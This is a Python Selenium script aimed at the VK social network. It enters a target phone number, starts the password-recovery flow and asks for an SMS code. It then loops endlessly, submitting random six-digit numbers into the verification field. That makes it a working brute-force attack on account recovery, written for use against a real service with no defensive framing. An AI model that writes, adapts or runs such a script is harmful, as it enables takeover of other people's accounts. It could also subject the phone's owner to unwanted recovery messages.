import time
from random import *
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

s = Service(executable_path='PATH/TO/driver') # <--------------------
driver = webdriver.Chrome(service=s)

driver.maximize_window()
driver.get('https://vk.com')
time.sleep(5)

email_input = driver.find_element(By.ID, 'index_email')
email_input.clear()
email_input.send_keys('PHONE_NUMBER_INPUT') # <--------------------
email_input.send_keys(Keys.ENTER)
time.sleep(25)

password_forgot = driver.find_element(By.CLASS_NAME, 'vkc__PureButton__button.vkc__Link__link.vkc__Link__primary')
password_forgot.send_keys(Keys.ENTER)
time.sleep(5)


password_reduce = driver.find_element(By.CLASS_NAME, 'vkuiButton.vkuiButton--sz-m.vkuiButton--lvl-secondary.vkuiButton--clr-accent.vkuiButton--aln-center.vkuiButton--sizeY-compact.vkuiButton--stretched.vkuiTappable.vkuiTappable--sizeX-regular.vkuiTappable--hasHover.vkuiTappable--hasActive.vkuiTappable--mouse')
password_reduce.send_keys(Keys.ENTER)
time.sleep(25)

confirm_action = driver.find_element(By.CLASS_NAME, 'vkuiButton.vkuiButton--size-m.vkuiButton--mode-primary.vkuiButton--appearance-accent.vkuiButton--align-center.vkuiButton--sizeY-none.vkuiButton--android.vkuiTappable.vkuiInternalTappable.vkuiTappable--sizeX-none.vkuiTappable--hasHover.vkuiTappable--hasActive')
confirm_action.send_keys(Keys.ENTER)
time.sleep(15)

try:
    confirm_action_2 = driver.find_element(By.CLASS_NAME, 'vkuiButton.vkuiButton--size-m.vkuiButton--mode-primary.vkuiButton--appearance-accent.vkuiButton--align-center.vkuiButton--sizeY-none.vkuiButton--android.vkuiTappable.vkuiInternalTappable.vkuiTappable--sizeX-none.vkuiTappable--hasHover.vkuiTappable--hasActive')
    confirm_action_2.send_keys(Keys.ENTER)
    time.sleep(10) 

except Exception:
    pass

finally:

    try:
        input_sms = 'vkuiFormField vkuiFormField--mode-default vkuiFormField--sizeY-none vkuiInput vkuiInput--align-center vkuiInput--sizeY-none CUACodeInput-common--jz025o'
        input_phone_number = None
            
        send_to_SMS = driver.find_element(By.CLASS_NAME, 'vkuiButton.vkuiButton--size-m.vkuiButton--mode-tertiary.vkuiButton--appearance-accent.vkuiButton--align-center.vkuiButton--sizeY-none.vkuiButton--android.vkuiTappable.vkuiInternalTappable.vkuiTappable--sizeX-none.vkuiTappable--hasHover.vkuiTappable--hasActive')
        send_to_SMS.send_keys(Keys.ENTER)
        time.sleep(10) 

    except Exception:
        while 1:
            try:
                ok = driver.find_element(By.CLASS_NAME, 'vkuiAlert__button.vkuiButton.vkuiButton--size-m.vkuiButton--mode-tertiary.vkuiButton--appearance-accent.vkuiButton--align-center.vkuiButton--sizeY-none.vkuiButton--android.vkuiTappable.vkuiInternalTappable.vkuiTappable--sizeX-none.vkuiTappable--hasHover.vkuiTappable--hasActive')
                ok.send_keys(Keys.ENTER)
                time.sleep(10)

            except Exception:
                SMS_input = driver.find_element(By.CLASS_NAME, 'vkuiInput__el')
                SMS_input.clear()
                SMS_input.send_keys(str(randint(99999, 1000000)))
                SMS_input.send_keys(Keys.ENTER)
                time.sleep(10)

                


    finally:
        pass
    
driver.close()
driver.quit()

